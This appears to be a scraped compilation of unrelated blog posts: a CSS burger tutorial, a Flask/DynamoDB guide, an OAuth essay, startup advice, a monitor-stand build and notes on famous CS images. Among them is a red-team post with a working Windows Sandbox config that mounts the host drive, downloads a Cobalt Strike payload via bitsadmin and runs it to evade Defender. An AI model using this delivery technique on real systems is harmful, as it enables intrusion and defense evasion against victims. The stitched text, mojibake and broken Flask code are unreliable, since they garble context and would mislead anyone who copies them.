<li>In CSS it's possible to use as many box shadows as we want.</li>
</ul>
<p>So... we simply add more box shadows! </p>
<pre><code>.burger {
  /* Same code as before */
  width: 380px;
  height: 40px;
  border-radius: 15px; 

  /* Updated box shadow */
  box-shadow: 
      10px 50px #fddb28, /* Cheese */
      10px 85px #681f24, /* Meat */
      10px 120px #82af15; /* Lettuce */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/4.png" alt=""></p>
<p>Note that the shadows' order is important, since the first one will have a higher z-index and will appear in front of the others. </p>
<h2>The sesame seeds</h2>
<p>Our burger is taking shape, but it currently looks a lot like a hot dog. We should fix that by adding some sesame seeds to the top bun. </p>
<p>First we draw a single sesame seed with a <code>box-shadow</code>.</p>
<pre><code>.burger:after {
  content: "";
  display: block;

  /* Size and shape */
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Position and color */
  box-shadow: 100px -165px #ffffff;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5b.png" alt=""></p>
<p>Then we duplicate it by using many box shadows.</p>
<pre><code>.burger:after {
  /* Keep same code as before */
  content: "";
  display: block;
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Add new box-shadow */
  box-shadow: 
      /* Top row */
      100px -165px #ffffff,
      160px -165px #ffffff,
      230px -165px #ffffff,
      290px -165px #ffffff,

      /* Bottom row */
      60px -135px #ffffff,
      125px -135px #ffffff,
      190px -135px #ffffff,
      255px -135px #ffffff,
      330px -135px #ffffff;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5.png" alt=""></p>
<h2>Better cheese</h2>
<p>It would be nice if we could make our cheese look more like cheese. For example by showing one of the corners of the cheese slice. This means drawing a new shape (a yellow triangle) even though we already use all our CSS selectors.</p>
<p>If we look carefully at our code, we will notice that there's one thing we haven't really used so far: the <code>content</code> property. Let's see what happens when we add the character <code>▾</code> in it.</p>
<pre><code>.burger:before {
  /* Change the content property */
  content: "▾";

  /* Color and Size of the ▾ */
  color: #fddb28;
  font-size: 120px;

  /* Then keep everything else the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5c.png" alt=""></p>
<p>We do get a new shape displayed, but it's in the wrong position. And once again we cannot use <code>margin</code> or <code>padding</code> to solve that. </p>
<p>But with some CSS tricks, we will make this work. </p>
<pre><code>.burger:before {
  /* Add 8 spaces before the triangle */
  content: "        ▾";

  /* Actually display the spaces in the "content" */ 
  white-space: pre;

  /* Vertically position the ▾ */
  line-height: 25px;

  /* Then keep everything the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>And we finished our cheeseburger!</p>
<h2>Bonus</h2>
<p>When emailing a friend about my challenge, she replied with this clever answer.</p>
<pre><code>.burger:before {
  content: "🍔";
  font-size: 100px;
}</code></pre>
<p>That's a lot less CSS for a better looking result. </p>
<h2>Conclusion</h2>
<p>I'm really impressed with what I managed to achieve with a single div and some CSS. Of course using SVG would have made more sense, but where's the fun in that?</p>

<p>Weaponizing Windows Sandbox To Bypass Defender</p>
<p><a href="">●</a> 02 Dec 2020</p>

<h2 id="introduction">Introduction</h2>
<p>I’ve not posted on here since May, as I’ve been busy with (well, life in general) projects and whatnot. This short blog post may be useful for a Red Team by living-of-the-land for the execution of payloads on a machine where Windows Sandbox can be enabled; Windows Sandbox is designed to work this way - no exploitation of anything is covered in this post. With this technique in terms of executing within a VM, we don’t need to load an external ISO onto the machine, as all of this is handled by the sandbox. From my visibility, <code>.wsb</code> was not inspected or blacklisted on any major EDR or AV.</p>
<p>At the tail end of last year, Microsoft introduced a new feature named Windows Sandbox (WSB for short). Windows Sandbox allows you to quickly, within 15s, create a disposable Hyper-V based Virtual Machine with all of the qualities a familiar VM would have such as clipboard sharing, mapping directories etc. The sandbox is also the underlay for Microsoft Defender Application Guard (WDAG), for dynamic analysis on Hyper-V enabled hosts and can be enabled on any Windows 10 Pro or Enterprise machine - making this a perfect as a living off the land technique.</p>
<p>The tl;dr of this technique is to craft a .wsb that can be executed on an endpoint, which mounts the user’s file-system, allowing us to execute the implant inside a hidden VM and bypass any AV/EDR that’s on the host. The WSB configuration also seems to be bypassing Windows Defender on the host where it’s executed. It’s not incredibly complicated but could prove useful in an engagement.</p>
<h2 id="technique">Technique</h2>
<p>To enable the sandbox on the host machine, we can simply run the following in PowerShell:</p>
<pre><code>Enable-WindowsOptionalFeature -FeatureName "Containers-DisposableClientVM" -All -Online
</code></pre>
<p>As the interactive sandbox is mainly designed for an end-user to deem if a file is malicious or not, Windows Defender is not enabled by default for obvious reasons. We can observe this below.</p>
<pre><code>PS C:\Users\WDAGUtilityAccount&gt; Get-MpComputerStatus
Get-MpComputerStatus : Provider load failure
At line:1 char:1
+ Get-MpComputerStatus
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (MSFT_MpComputerStatus:ROOT\Microsoft\...pComputerStatus) [Get-MpComputerS
   tatus], CimException
    + FullyQualifiedErrorId : HRESULT 0x80041013,Get-MpComputerStatus
</code></pre>
<p>The user can either launch a default instance of the sandbox or create a .wsb file with specific parameters. These parameters are defined by Microsoft <a href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/windows-sandbox-config-files/ba-p/354902">here</a>. The WSB extension is associated with Windows Sandbox and will launch a new instance with your defined values. For example, the below configuration will run <code>cmd</code> and <code>ping</code> upon boot.</p>
<pre><code>&lt;LogonCommand&gt; 
  &lt;Command&gt;
    cmd.exe /c ping 8.8.8.8
  &lt;/Command&gt; 
&lt;/LogonCommand&gt;
</code></pre>
<p>We can also specify a folder or drive to map to, in which the guest inherits the file permissions. We can read/write to the folder:</p>
<pre><code>&lt;MappedFolders&gt; 
  &lt;MappedFolder&gt;  
    &lt;HostFolder&gt;C:\&lt;/HostFolder&gt;  
    &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\C_Mount&lt;/SandboxFolder&gt;  
    &lt;ReadOnly&gt;false&lt;/ReadOnly&gt;  
  &lt;/MappedFolder&gt;
</code></pre>
<p>So, if we craft a .wsb configuration file, with folders we want to access, along with a logon command we can execute an implant inside of the Windows Sandbox with full read/write access to the file-system with one click. Below is a crafted proof-of-concept WSB configuration, where the root drive (<code>C:\</code>) is mapped to <code>C:\Users\WDAGUtilityAccount\UserFiles</code>.&nbsp; On execution of the WSB file, a Cobalt Strike payload is executed from %APPDATA% inside the VM with full access to the root file system. The WSB file is also <strong>undetected on the host</strong>.</p>
<pre><code>&lt;Configuration&gt; 
  &lt;MappedFolders&gt; 
    &lt;MappedFolder&gt; 
      &lt;HostFolder&gt;C:\&lt;/HostFolder&gt; 
      &lt;SandboxFolder&gt;C:\Users\WDAGUtilityAccount\UserFiles&lt;/SandboxFolder&gt; 
      &lt;ReadOnly&gt;false&lt;/ReadOnly&gt; 
    &lt;/MappedFolder&gt; 
  &lt;/MappedFolders&gt; 
  &lt;LogonCommand&gt; 
    &lt;Command&gt;C:\Users\ping 127.0.0.1 -n 3&gt;null&amp;bitsadmin /transfer myjob /download /priority high http://192.168.0.4/cs_wsb_test.bin "%APPDATA%\cs.exe"&gt;nul&amp;start %APPDATA%\cs.exe&lt;/Command&gt; 
  &lt;/LogonCommand&gt; 
&lt;/Configuration&gt;
</code></pre>
<p>The command could be anything - I just used the one above as a placeholder. The <code>.wsb</code> extension is also registered to be handled by <code>WindowsSandbox.exe</code> - giving room to a social engineering attack encouraging a victim to execute it where it is enabled.</p>
<h2 id="conclusion">Conclusion</h2>
<p>A similar technique has been used by the infamous Maze and Ragnar locker threat actors in recent times; however, they have installed 3rd party virtualisation suites such as VMWare &amp; VBox - using Windows Sandbox bypasses the requirement for this software to be installed. To complement this technique, I created a simple Go program to find drives automatically and mounted network shares that can include as a mapped folder, to then generate a WSB based on this. This can be found <a href="https://github.com/LloydLabs/wsb-construct">here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Unlike Django, Flask is not directly tie-up with any database. So we can use Flask with either SQL and No-SQL. And that makes the Flask framework superior among other web frameworks and most suitable for serverless architecture. In this article, I’m going to explain how to code the flask application and database as DynamoDB and deploy to AWS Lambda.</p><h2 id="introduction">Introduction</h2><p>The application architecture will look like this, First I’ve created the file resources.py where I initiate the boto3 client. And I’ve created a models.py file that holds all the class references. And finally, I have the JSON file to create the DynamoDB table automatically from the script.</p><h2 id="table-json">Table JSON</h2><p>You can also create the table directly in the AWS console but my local development
I’m using DynamoDB local instance so I’ve to reply on other technique to create the
the table in my local and one of the methods is using the awscli command.</p><pre><code>{
    "TableName": "User",
    "KeySchema": [{ "AttributeName": "email", "KeyType": "HASH" }],
    "AttributeDefinitions": [{ "AttributeName": "email", "AttributeType": "S" }],
    "ProvisionedThroughput": { "ReadCapacityUnits": 5, "WriteCapacityUnits": 5 }
  }
</code></pre><p>Once you have the JSON file you can run the below command to create the table.</p><pre><code>aws dynamodb create-table --cli-input-json file:////actual_file_path/models/create-user.json --endpoint-url http://localhost:8000
</code></pre><p>You can remove the <code>--endpoint-url</code> if you’re creating the table in AWS console.</p><h2 id="models">Models</h2><p>I’ve created the class reference for each table. One of the benefits of having this Python object is to deal with DynamoDB response in your template and code.</p><p>Also, for authentication purposes, I’ve used the flask login so that you can create authentication with this code.</p><pre><code>from flask_login import UserMixin

class User(UserMixin):
    def __init__(self):
          self.email = None
           self.first_name = None
           self.last_name = None

   def get_id(self):
        return self.VE


    def init_user(self, response):
        self.email = response["email"]["S"]

        if "first_name" in response:
            self.first_name = response["first_name"]["S"]

        return self
</code></pre><h2 id="resources">Resources</h2><p>In order to make the CRUD operation very easy i’ve created the prepare function.
That takes the args, kwargs and turn into the dict. This dict will be useful in
update operation.</p><p>And the get function nothing but make the DynamoDB call and convert into the
class object. And then you can use this class object in your template. Also you can
pass the class object to jinja2 template and use it in the template as you like.</p><pre><code>import boto3

dynamo_client = boto3.client("dynamodb")
dynamodb_resource = boto3.resource("dynamodb")
</code></pre><pre><code>def prepare_user(email, first_name=None, last_name):
    return {"email": email, "first_name": first_name, "last_name": last_name}
</code></pre><p>Main purpose of this prepare user is to create the dict that directly use in CRUD operation.</p><pre><code>def get_user(email):
    response = dynamo_client.get_item(Key={"email": {"S": email}}, TableName="User")

    if "Item" in response:
        return User().init_user(response["Item"])

    return None
</code></pre><p>you can also create the update_user and delete_user function and use it in your code.</p><h2 id="conclusion">Conclusion</h2><p>What we have seen is how to incorporate DynamoDB in our flask based project. First the
resources and the creation of the table from JSON file and then have the model class based
python reference and then finally the CRUD operation function.</p></div><p>This article published under

December 2, 2020 | https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization | <a href="https://web.archive.org/web/*/https://www.scottbrady91.com/OAuth/OAuth-is-Not-User-Authorization">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div itemprop="articleBody">
<p>
In the same way that <a href="https://www.scottbrady91.com/OAuth/OAuth-is-Not-Authentication" title="OAuth is Not Authentication" target="_blank">OAuth is not authentication</a>, it <strong>also does not tell us what the user is allowed to do or represent that the user can access a protected resource</strong> (an API).
</p>
<p>
Understanding what OAuth is not is just as important as knowing what it is, in order to use it effectively.
In this article, I’m going to discuss how OAuth does not include user authorization and why user authorization rules should not live within your OAuth authorization server.
</p>
<p>
<span>TL;DR:</span> OAuth is not suitable for user authorization.
The fact that you have an access token that allows you to act on the user’s behalf does not mean that the user can perform an action.
</p>
<h2>Client Authorization (Delegation)</h2>
<p>
OAuth is an authorization protocol, but maybe a better name for it is a delegation protocol.
It is a protocol that allows a client application to request permission to access a protected resource (API) on the resource owner’s (the user’s) behalf.
</p>
<p>
Let’s take a look at the authorization process:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf (by redirecting the user to the authorization server’s authorization endpoint, specifying exactly what they would like to access (scopes))</li>
<li>The user identifies themselves to the authorization server (but remember, OAuth is not authentication; you’ll need OpenID Connect to help you with that)</li>
<li>The user authorizes the client application to access the protected resource on their behalf (using the OAuth consent process)</li>
<li>The client application is issued an access token</li>
</ol>
<p>
<strong>An access token represents that the client application has been authorized by the user</strong>.
The protected resource can look at the access token and say, “okay, Alice authorized this application to access these parts of my system on their behalf; I’ll let it through”.
However, <strong>just because Alice said it was okay does not mean that Alice is authorized to access the protected resource</strong>.
</p>
<h3>Client Authorization vs. User Authorization</h3>
<p>
Let’s break that down, using a banking system as an example:
</p>
<ul>
<li><strong>Client authorization:</strong> can this client application read Alice’s transaction history?</li>
<li><strong>User authorization:</strong> can Alice view the balance of account #123?</li>
</ul>
<p>
OAuth can handle client authorization by issuing an access token that Alice authorized.
OAuth cannot handle user authorization.
</p>
<p>
Open Banking &amp; FAPI introduce <a href="https://tools.ietf.org/html/draft-ietf-oauth-rar" target="_blank" rel="noopener">Rich Authorization Requests</a> (RAR), where a client application can ask the user to authorize a specific transaction.
But again, this is about the user consenting to the transaction, as opposed to what the user is allowed to do.
</p>
<h2>User Authorization Rules in your OAuth Authorization Server</h2>
<p>
Hopefully, it’s now clear that an OAuth access token (or an OpenID Connect identity token for that matter) does not represent the user’s permission to do something.
But what about putting user-level authorization rules within your authorization server?
After all, you already kind of have that with the user authentication process.
</p>
<h3>User-level authorization during authentication</h3>
<p>
This is where I am happy to give some ground.
Confirming that the user is authorized to use your system when they authenticate is perfectly acceptable.
For example, has the user been disabled by an administrator?
Do they still qualify to use your services?
</p>
<p>
If you decide that the authenticating user is not authorized to use your system, you simply do not let them log in.
These kinds of checks can also be performed during token generation or maybe as part of token validation (think of the introspection endpoint).
</p>
<h3>User-level authorization based on request</h3>
<p>
What breaks this is when you try and add user-level authorization per client application or protected resource.
For instance, is the user permitted to use this scope?
Are they permitted to use this client application (while OAuth is not authentication, you may see this check when using OpenID Connect)?
</p>
<p>
This would make your OAuth authorization process look like this:
</p>
<ol>
<li>The client application asks the user if they can access a protected resource on their behalf </li>
<li>The user identifies themselves to the authorization server </li>
<li>The authorization server decides if the user is authorized to access the client or protected resource</li>
<li>The user authorizes the client application to access the protected resource on their behalf</li>
<li>The client application is issued an access token</li>
</ol>
<p>
Adding another Access-Control List (ACL) to your authorization server can’t be that bad, right?
After all, it is an <em>authorization</em> server!
</p>
<p>
In my opinion, this is <strong>brittle and prone to error</strong>.
You are now back to relying on the fact that tokens were issued to represent that the user and the request have been authorized, which is not something OAuth was designed for and is a dangerous assumption to make.
</p>
<p>
Just as many attempts to use OAuth to represent user authentication have failed, I’ve seen the same happen with user authorization too many times.
The protocols just weren’t designed for it, and it’s just too easy to get wrong, especially when your token issuer is also providing SSO, issuing tokens without user interaction.
</p>
<p>
You are likely using a framework or out-of-the-box solution as your OAuth authorization server, which will want to follow the OAuth specification and issue a token to the authorized client application.
<strong>You’ll spend your time fighting the design of OAuth</strong>, and if you make a single mistake or misunderstand how your framework of choice works, then the authorization server will kick in and issue the token as the user and client have requested, just like it is meant to.
</p>
<p>
I know I’m blurring the lines between OAuth and OpenID Connect a little here, but here’s a Stack Overflow question that I think highlights the kind of bizarre scenario you could find yourself in:
</p>
<blockquote>
“I am looking [for] a way for [my authorization server] to invalidate the submitted token if the user doesn’t have access to the application in a single go, even though the challenged token might be valid if it is submitted by other application which the user has access to”
</blockquote>
<p>
While you initially wanted to have all of your user authorization rules live within your central OAuth authorization server, you will likely end up duplicating these checks into your client applications and APIs to solve these kinds of problems.
You are probably going to code yourself into a corner.
</p>
<h2>User Permissions in your OAuth Authorization Server</h2>
<p>
This is where most of my customers end up after understanding that user-level authorization is not part of the OAuth protocol and that it is not an easy fit within their OAuth authorization server.
But the desire to write all of their authorization logic and user permissions in a single place still exists, which is understandable, especially when they have already achieved that with authentication and API access by using an SSO solution that implements both OAuth and OpenID Connect.
</p>
<p>
So, what is the solution? Role-Based Access Control (RBAC)?
Stuff tokens full of user permissions?
</p>
<p>
Well, that is a story for another day and well outside of this OAuth story.
I recommend checking out Dom’s excellent article on how <a href="https://leastprivilege.com/2016/12/16/identity-vs-permissions/" target="_blank" rel="noopener">identity and permissions don’t mix within an SSO solution</a>.
For solutions, take a look at how <a href="https://www.identityserver.com/documentation/enforcer/alfa/IntroducingAlfa/" target="_blank" rel="noopener">authorization languages are evolving</a> with ALFA and how you can create authorization policies in a single place that are readable by non-developers.
</p>
<h2>The Random Stuff</h2>
<p>
This article would not be complete without collating some of the weird and wonderful loaded questions I have received on Stack Overflow or my blog.
These are often followed by a “gotcha” or a “checkmate”, or sometimes even a personal insult.
But I’ll let your imagination come up with those.
</p>
<h3>“Then why is it called an authorization code?”</h3>
<p>
The authorization code represents the user authorizing the client application on their behalf. Again, that is client authorization, not permission to add user authorization.
</p>
<h3>“Then why do people return 401 Unauthorized when you don’t have a token?”</h3>
<p>
Naming is hard.
In this use case, it would be nice to have named this status code “Unauthenticated”, but at least <a href="https://tools.ietf.org/html/rfc7235#section-3.1" target="_blank" rel="noopener">RFC 7235</a> requires that you include a <code>WWW-Authenticate</code> header alongside this status code.
</p>
<h3>“Then why is it called the Authorization header?”</h3>
<p>
Again, naming is hard. Basic Authentication also uses the Authorization header, but that doesn’t mean the user has full access or is even allowed to use the application.
You still have to check if the user is allowed to perform an action.
</p>
<h3>“Then what are scopes for?”</h3>
<p>
Scopes represent a level of access that a client application is asking for from the user.
For instance, a scope called “email.read” might mean “can I read your emails?”, or “email.send” might mean “can I send emails on your behalf?”.
Check out Auth0’s article on <a href="https://auth0.com/blog/on-the-nature-of-oauth2-scopes/" target="_blank" rel="noopener">the nature of OAuth scopes</a>.
</p>
<p>
This is a fairly common mistake to make when starting out with OAuth, so I’ll forgive you for this one.
</p>

<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks. For many of our roles at Segment, we've had to talk with 50-100 different people to make an eventual hire.</p><p><strong>If you have 24 months of runway, and a clear list of things youâ€™d do if you had more copies of yourself: you probably aren't spending time to hire the people you need.</strong></p><p>At Segment, my co-founder <a href="https://twitter.com/ivolo">Ilya</a> fulfilled this role. It was back in 2014, we were 12 people at the time, had raised a $10m Series A, and had $1m in revenue.</p><p>Thing…</p></div></div>

<p>
While this is one of the simplest things I’ve made it’s also one of my favourites. All you need is a shelf or any other board cut to the correct size and access to a 3D printer. There are online services you can order 3D printed objects from if you don’t have access to a printer yourself. The advantage to using the Ikea shelf as I did is that it comes the perfect size and is already finished. Living in the city with easier access to Ikea than a workshop this is very convenient. If you do have a shop you could make the top out of anything you like.
</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-3d-model.png" alt="Monitor Stand 3D Model" title="Monitor Stand 3D Model"></p>
<p>Here’s the self I ordered from ikea: <a href="https://www.ikea.com/ca/en/p/svalnaes-shelf-bamboo-00322859/">Ikea SVALNÄS Shelf</a>. While waiting for it to ship I modeled some feet in Fusion360. My main requirements were that the stand has to hold my 27 inch monitor and it has to fit my midi keyboard underneath. I’ve uploaded the models for the feet on <a href="https://www.thingiverse.com/thing:4673014">Thingiverse</a>.</p>
<p><img src="https://www.iansmith.is/images/monitor-stand/monitor-stand-feet.jpeg" alt="Monitor Stand Feet" title="Monitor Stand Feet"></p>
<p>Once you have the feet printed and have the top all you’ll need is a drill and some screws. Set each foot in place and mark the holes. Then carefully pre-drill about halfway through the shelf. The Ikea shelf is particularly soft, it may even be somewhat hollow. You’ll want to make sure you don’t accidentally drill all the way through. I wrapped some painters tape around the drill bit to mark the depth. Once you have the holes drilled crew the feet into place and tighten by hand. The screws are only there to hold the feet in place and don’t actually take any weight so no need to over tighten them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    
<p>Over the years I've noticed some images (not diagrams or graphs) that are recognizable to programmers. These images also often have backstories that contain educational information, so here they are! </p>
<h3 id="lena">Lena<a href="#lena" aria-label="Anchor link for: lena"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/lena.png" alt=""></p>
<p>Lena is a Swedish model and this photo of her is from a Playboy cover. Her name is sometimes spelled "Lenna" to encourage her name to be pronounced as "leh-nah" instead of "lee-nah", which is a mildly amusing parallel to classification tasks. The full image has her mostly nude. </p>
<p>The photo was first used six months after release in 1972 because of the mixture of textures and colours for testing an image compression algorithm. This eventually led to JPEGs (first released 1992). It's was standard to use the image to showcase differences between image compression algorithms .</p>
<p>For obvious reasons, having a nude model be the face of all image processing has raised concerns. Still there are blog posts, papers and websites that still use Lena for image processing, though recently it's been about computer vision, style transfer, etc. </p>
<h3 id="the-cornell-box">The Cornell Box<a href="#the-cornell-box" aria-label="Anchor link for: the-cornell-box"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/cornellbox.png" alt=""></p>
<p>Anyone who has taken a graphics course has seen this box as it was first presented at a SIGGRAPH in 1984. It consists of five planes, an overhead light, a rectangular prism and cube. Variations are often seen with spheres of different materials such as dielectrics (glass),  and metals instead of lambertians (the matte texture). </p>
<p>For a raytracer (or pathtracer) this tests a lot of important features. The shadowing of the rectangle onto the wall, contrasting wall colours that should emit some colour onto the white (this is called diffuse reflection). </p>
<p>As shown below, it can also showcase (or rather, suffer from) tone mapping, which is a technique used to map a set of colours to another to make the range look "dynamic" or at least correct. The image below has a bug where the lack of tonemapping causes the image to bug out where it tries to make the colour brighter than a pure white pixel. </p>
<p>Another issue with the image below is the noise, which can be fixed by more sampling in this specific case as it's a monte carlo ray tracer, so it uses some brute force and randomization as computers can't actually simulate light going in infinite directions. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/badtracer.png" alt=""></p>
<p>Other classic rendering images include the Stanford bunny and the Utah teapot. It's been a meme to hide the Utah teapot into random scenes, and the teapot is the graphics version of "Hello World". It appears in Toy Story, the Simpsons, a Windows screensaver, and the Sims. Here's a <a href="https://www.youtube.com/watch?v=TIxt9guMbXo">2.5 minute video about the teapot from Tom Scott</a>. </p>
<p><img src="https://carolchen.me/blog/img/cs_images/bunny.png" alt=""></p>
<p><img src="https://carolchen.me/blog/img/cs_images/utahteapost.png" alt=""></p>
<h3 id="the-big-red-mobile">The Big Red Mobile<a href="#the-big-red-mobile" aria-label="Anchor link for: the-big-red-mobile"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/bigred.jpeg" alt=""></p>
<p>CLRS! The iconic graphic on the textbook is obviously representative of a tree, but it's actually based on a piece of art. It was made by Alexander Calder in 1959. If you don't already know about mobiles, they're really cool, carefully engineered to work with equilibrium and air currents. Big Red, made from sheet metal and steel weird, can be found at the Whitney Museum of American Art! </p>
<p>Fun fact, Cormen (the C in CLRS) and co wanted to recolour the depiction to use red and black, but the Calder estate would not allow it. You can also purchase <a href="https://www.hangingmobilegallery.com/big-red-mobile/">similar versions of the mobile</a>.</p>
<h3 id="the-dragon-book-cover">The Dragon Book Cover<a href="#the-dragon-book-cover" aria-label="Anchor link for: the-dragon-book-cover"> <i></i></a>
</h3>
<p><img src="https://carolchen.me/blog/img/cs_images/dragon.jpg" alt=""></p>
